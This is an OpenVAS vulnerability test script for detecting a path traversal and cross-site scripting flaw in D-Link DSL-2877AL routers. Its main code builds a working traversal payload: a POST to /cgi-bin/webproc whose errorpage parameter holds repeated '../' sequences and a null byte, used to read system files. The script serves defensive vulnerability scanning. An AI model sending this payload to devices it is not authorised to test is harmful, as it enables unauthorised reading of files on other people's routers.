###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dlink_dsl_xss_n_path_trav_vuln.nasl 12045 2018-10-24 06:51:17Z mmartin $
#
# D-Link DSL Devices Directory Traversal And Cross Site Scripting Vulnerabilities
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2018 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/h:dlink";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.813804");
  script_version("$Revision: 12045 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-24 08:51:17 +0200 (Wed, 24 Oct 2018) $");
  script_tag(name:"creation_date", value:"2018-07-25 10:11:37 +0530 (Wed, 25 Jul 2018)");
  script_name("D-Link DSL Devices Directory Traversal And Cross Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_dlink_dsl_detect.nasl");
  script_mandatory_keys("host_is_dlink_dsl");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/45084");

  script_tag(name:"summary", value:"The host is a D-Link DSL router
  and is prone to path traversal and cross site scripting vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send the crafted HTTP POST request
  and check whether it is possible to read a file on the filesystem or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to an insufficient
  validation for errorpage parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read arbitrary files on the target system and execute arbitrary
  script further leading to authentication bypass easily.");

  script_tag(name:"affected", value:"D-Link DSL-2877AL with Firmware Version
  ME_1.08. Other models or versions might be also affected.");

  script_tag(name:"solution", value:"No known solution is available as of
  04th September, 2018. Information regarding this issue will be updated once
  solution details are available.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"NoneAvailable");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port_from_cpe_prefix( cpe:CPE ) ) exit( 0 );

files = traversal_files( "linux" );
url = "/cgi-bin/webproc";

foreach file( keys( files ) ) {

  data = "getpage=html%2Findex.html&errorpage=" + crap( data:"../", length:3*12 ) + files[file] + "%00&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&%3Ausername=admin";
  req = http_post_req( port:port, url:url, data:data );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  if( buf =~ "^HTTP/1\.[01] 200" && egrep( string:buf, pattern:file, icase:TRUE ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );